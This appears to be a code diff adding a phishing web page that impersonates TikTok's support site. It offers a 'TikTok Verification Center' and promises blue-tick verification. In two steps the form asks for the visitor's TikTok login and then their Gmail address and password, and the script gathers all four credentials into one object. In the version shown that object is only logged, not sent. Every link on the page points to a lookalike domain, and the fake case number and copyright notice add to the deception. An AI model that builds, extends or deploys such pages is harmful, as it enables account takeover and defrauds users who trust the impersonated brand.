@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Verification Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .header-content {
+            width: 100%;
+            background: #000;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+
+        .hamburger-wrapper {
+            display: flex;
+            align-items: center;
+        }
+
+        .hamburger-menu {
+            cursor: pointer;
+            padding: 10px;
+        }
+
+        .hamburger-menu-wrapper {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 24px;
+            height: 16px;
+        }
+
+        .hamburger-menu-wrapper span {
+            width: 100%;
+            height: 2px;
+            background: #fff;
+            transition: all 0.3s;
+        }
+
+        .logo-container {
+            margin-left: 15px;
+        }
+
+        .logo-link {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 10px;
+        }
+
+        .logo-text {
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .logo-link strong {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 60vh;
+            margin-bottom: 40px;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            display: none;
+            border: 2px solid #ff0050;
+        }
+
+        .container.active {
+            display: block;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .form-label {
+            display: block;
+            text-align: left;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e1e1;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #ff0050;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #ff0050;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #e6004a;
+        }
+
+        .case-number {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .footer-container {
+            width: 100vw;
+            margin-left: calc(-50vw + 50%);
+            background-color: #000;
+            color: #fff;
+            margin-top: 60px;
+        }
+
+        .download-container {
+            background-color: #000;
+            padding: 48px 24px 24px;
+        }
+
+        .download-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .download-content h2 {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+
+        .download-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .qr-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .qr-btn:hover {
+            background-color: rgba(255,255,255,0.1);
+        }
+
+        .qr-image {
+            width: 24px;
+            height: 24px;
+        }
+
+        .qr-btn span {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .download-wrapper a {
+            display: inline-block;
+        }
+
+        .download-wrapper img {
+            height: 48px;
+            width: auto;
+            transition: opacity 0.3s;
+        }
+
+        .download-wrapper img:hover {
+            opacity: 0.8;
+        }
+
+        .ms-image-wrapper {
+            display: inline-block;
+        }
+
+        .footer-content-wrapper {
+            background-color: #000;
+            padding: 48px 24px 24px;
+            display: flex;
+            max-width: 1200px;
+            margin: 0 auto;
+            gap: 48px;
+            flex-wrap: wrap;
+        }
+
+        .tiktok-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-basis: 100%;
+        }
+
+        .logo-container {
+            display: inline-block;
+        }
+
+        .logo-group {
+            height: 32px;
+            width: auto;
+        }
+
+        .tiktok-logo strong {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .footer-content-column {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-content-column h4 {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .footer-content-column h5 {
+            margin-bottom: 8px;
+        }
+
+        .footer-content-column a {
+            color: rgba(255,255,255,0.75);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            transition: color 0.3s;
+        }
+
+        .footer-content-column a:hover {
+            color: #fff;
+        }
+
+        .footer-bottom-wrapper {
+            background-color: #000;
+            padding: 24px;
+            border-top: 1px solid rgba(255,255,255,0.12);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .language-selection {
+            position: relative;
+            padding: 8px 32px 8px 12px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .language-selection p {
+            color: rgba(255,255,255,0.75);
+            font-size: 14px;
+        }
+
+        .language-selection-form {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .copyright {
+            color: rgba(255,255,255,0.5);
+            font-size: 14px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+        }
+
+        .modal-wrapper {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .modal-mask {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 32px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 300px;
+        }
+
+        .close {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .close:before, .close:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 16px;
+            height: 2px;
+            background: #333;
+            transform: translate(-50%, -50%) rotate(45deg);
+        }
+
+        .close:after {
+            transform: translate(-50%, -50%) rotate(-45deg);
+        }
+
+        .qr-title {
+            margin-bottom: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .qr-img {
+            width: 150px;
+            height: 150px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .footer-content-wrapper {
+                flex-direction: column;
+                gap: 24px;
+            }
+            
+            .footer-bottom-wrapper {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .download-content h2 {
+                font-size: 24px;
+            }
+
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header-content">
+        <div class="hamburger-wrapper">
+            <span class="hamburger-menu">
+                <span class="hamburger-menu-wrapper">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </span>
+            </span>
+            <div class="logo-container">
+                <a title="TikTok" class="logo-link" href="https://tiktokverifyrequests.rf.gd">
+                    <img class="logo-icon" src="tiktoklogo.png" alt="TikTok">
+                    <img class="logo-text" src="tiktokyatay.png" alt="TikTok">
+                    <strong>TikTok</strong>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="container active" id="step1">
+            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <h2>TikTok Verification Center</h2>
+            <p>Get help with your verification request for TikTok. Information shared will only be used to respond to your request.</p>
+            <label class="form-label" for="username">Email or Username</label>
+            <input type="text" id="username" placeholder="Email or Username" required>
+            <label class="form-label" for="password">Password</label>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="nextStep()">Next</button>
+            <div class="case-number">Case Number: 42726191315</div>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
+        </div>
+
+        <div class="container" id="step2">
+            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <h2>Additional Verification</h2>
+            <p>To complete the verification process, please enter your Gmail account information.</p>
+            <label class="form-label" for="gmail">Gmail Address</label>
+            <input type="email" id="gmail" placeholder="Gmail Address" required>
+            <label class="form-label" for="gmail-password">Gmail Password</label>
+            <input type="password" id="gmail-password" placeholder="Gmail Password" required>
+            <button onclick="submitForm()">Next</button>
+            <div class="case-number">Case Number: 42726191315</div>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
+        </div>
+
+        <div class="container" id="success">
+            <img src="tiktoklogo.png" alt="TikTok Logo" class="logo">
+            <h2>Application Received</h2>
+            <p>Your application has been processed. Your account will receive blue tick verification within approximately 24 hours.</p>
+            <div class="footer">© TikTok. 160 Inc., Direct Support</div>
+        </div>
+    </div>
+
+    <div class="footer-container">
+        <div class="download-container">
+            <div class="download-content">
+                <h2>Download Now</h2>
+                <div class="download-wrapper">
+                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                        <img class="apple" src="appstore.png" alt="apple-store">
+                    </a>
+                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                        <img class="google" src="googleplay.png" alt="google-store">
+                    </a>
+                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                        <img class="amazon" src="amazon.png" alt="amazon-store">
+                    </a>
+                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
+                        <div class="ms-image-wrapper">
+                            <img class="microsoft" src="microsoft.png" alt="microsoft-store">
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </div>
+        
+        <footer class="footer-content-wrapper">
+            <div class="tiktok-logo">
+                <a title="TikTok" class="logo-container" href="https://tiktokverifyrequests.rf.gd">
+                    <img src="tiktokyatay.png" class="logo-group">
+                </a>
+                <strong>TikTok</strong>
+            </div>
+            
+            <div class="footer-content-column">
+                <h4>Company</h4>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>About TikTok</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>News Room</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Contact</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>Careers</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>ByteDance</span></a></h5>
+            </div>
+            
+            <div class="footer-content-column">
+                <h4>Programs</h4>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok for Good</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok for Developers</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Effect House</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok Ads</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="noreferrer"><span>TikTok Browse</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Embeds</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Rewards</span></a></h5>
+            </div>
+            
+            <div class="footer-content-column">
+                <h4>Resources</h4>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Help Center</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Safety Center</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Creator Academy</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Community Guidelines</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Transparency</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Accessibility</span></a></h5>
+            </div>
+            
+            <div class="footer-content-column">
+                <h4>Legal</h4>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Terms of Service</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Privacy Policy</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>Digital Services Act</span></a></h5>
+                <h5 class="to-other"><a href="https://tiktokverifyrequests.rf.gd" rel="noreferrer"><span>TikTok Law Enforcement Guidelines</span></a></h5>
+            </div>
+        </footer>
+        
+        <div class="footer-bottom-wrapper">
+            <div class="language-selection" style="background:url(https://tiktokverifyrequests.rf.gd/arrow.svg) center no-repeat;background-position:right 10px bottom 11px">
+                <p><span>English</span></p>
+                <select class="language-selection-form" onchange="changeLanguage(this.value)">
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="de">Deutsch</option>
+                    <option value="en" selected>English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="it">Italiano</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt_BR">Português</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="ru">Русский</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="ko">한국어</option>
+                    <option value="ja">日本語</option>
+                    <option value="zh_Hant_tw">繁體中文</option>
+                    <option value="ar">العربية</option>
+                    <option value="ur">اردو</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="fil">Filipino</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="km">ភាសាខ្មែរ</option>
+                    <option value="uk">Українська</option>
+                    <option value="da">dansk</option>
+                </select>
+            </div>
+            <div class="copyright">© 2025 TikTok</div>
+        </div>
+    </div>
+
+    <script>
+        // Add Enter key functionality for forms
+        document.addEventListener('DOMContentLoaded', function() {
+            const step1Inputs = document.querySelectorAll('#step1 input');
+            const step2Inputs = document.querySelectorAll('#step2 input');
+            
+            step1Inputs.forEach(input => {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        nextStep();
+                    }
+                });
+            });
+            
+            step2Inputs.forEach(input => {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        submitForm();
+                    }
+                });
+            });
+        });
+
+        function nextStep() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                document.getElementById('step2').classList.add('active');
+            } else {
+                alert('Please fill in all fields.');
+            }
+        }
+
+        function submitForm() {
+            const gmail = document.getElementById('gmail').value;
+            const gmailPassword = document.getElementById('gmail-password').value;
+            
+            if (gmail && gmailPassword) {
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                document.getElementById('success').classList.add('active');
+                
+                const formData = {
+                    tiktokUsername: document.getElementById('username').value,
+                    tiktokPassword: document.getElementById('password').value,
+                    gmail: gmail,
+                    gmailPassword: gmailPassword,
+                    timestamp: new Date().toISOString()
+                };
+                
+                console.log('Form Data:', formData);
+            } else {
+                alert('Please fill in all fields.');
+            }
+        }
+
+        function changeLanguage(lang) {
+            console.log('Language changed to:', lang);
+        }
+    </script>
+</body>
+</html>
